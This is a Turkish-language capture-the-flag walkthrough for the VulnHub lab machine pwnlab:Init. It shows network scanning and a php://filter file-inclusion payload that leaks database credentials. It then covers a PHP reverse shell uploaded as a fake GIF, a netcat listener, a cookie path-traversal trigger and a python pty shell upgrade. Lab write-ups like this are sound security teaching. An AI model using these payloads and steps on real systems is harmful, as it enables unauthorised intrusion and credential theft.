https://www.vulnhub.com/entry/pwnlab-init,158/

pwnlab:Init
1. netdiscover -r 192.168.1.0/24
Bu komut kullanılarak makinan hangi IP de çalıştığını bulduk.

2. namp -p- 192.168.1.43
Bu komut ile ip üzerinde hangi Portların açık olduğuna baktık.
80: http
111: rpcbind
3306: mysql
39940: unknown

3. dirb http://192.168.1.43
Bu komut ile site buluna gizli sayfalar var mı kontrol ettik.
/index.php
/server-status
/images
/upload.php
/login.php

4. sqlmap -u http://192.168.1.43
Sql açıkları var mı yok mu diye kontol ettik.

5. Zap bir Grafik arayüzüne sahip bir program bunula 
Siteyi tartıp site içerisin açık varmı yok mu diye kontrol ettik

6. nikto -h http://192.168.1.43
Bu komut ile site üzerinde gili buluna sayfaların taramsını yaptık
/index.php
/server-status
/images
/upload.php
/login.php
/config.php

7. File Inclution denemesi yaptık http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
bu komutu kullanarak php dosyalarının içeriğini base64 olarak aldık ve 
config.php içerisinde mysql sifresini elde ettik.

8. mysql -u root -h 192.168.1.43 -p
MySQL bağlantısını kurduk

9. Reverse Shell php kodundaki IP ve Portu değişip siteye upload edilmesi gerekiyor. 
Ste image uzantılarını yükleye bildiği için php dosyasını kabul etiyecektir. bunun için php uzantısını gif formatında yükleme
yapmamız gerekicektir dosya içeriğne de GIF98 yazılması gerekir. Dosyamız başarılı olarak yüklenir.

10. nc -lvp 1234
NetCat ile yüklenen reverse shell dosyanın portu dinleceğiz.

11. BurpSuite kullannarak yüklediğimiz gif dosyasını çalıştrmamız gerekiyor. Bunun için Cookieleri kullanabiliriz
burpsuite ile gelen cookie bilgisini değişip yerine gif dosyasının yolu veriyoruz örn: Cookie: lang=/../upload/3208fd203ca8fdfa13bc98a4832c1396.gif
isteği gönderdiğimizde shell komutumuz bizi içeri alıcaktır. Fakat burada içeri girmemiz "su" komutunu çalıştıramıyoruz. bunun iiçin
python ile bir shell komutu çalıştırmamız gerekir.

12. Python shell kodu
echo "import pty; pty.spawn('/bin/bash');" > /tmp/shell.py
python /tmp/shell.py
ve bu code sayesinde bit üst seviye daha çıkmış bulunuyoruz.

13. /home/ dizini altında 4 kişi var bunlar dan kent ve kane sifresi MySQL deki ile aynı. Kane klasörü içerisinde msgmike
adında çalıştırıla bilir bir dosya var çalıştığında mike altına bir msg.txt file oluşturdu.

https://sniferl4bs.com

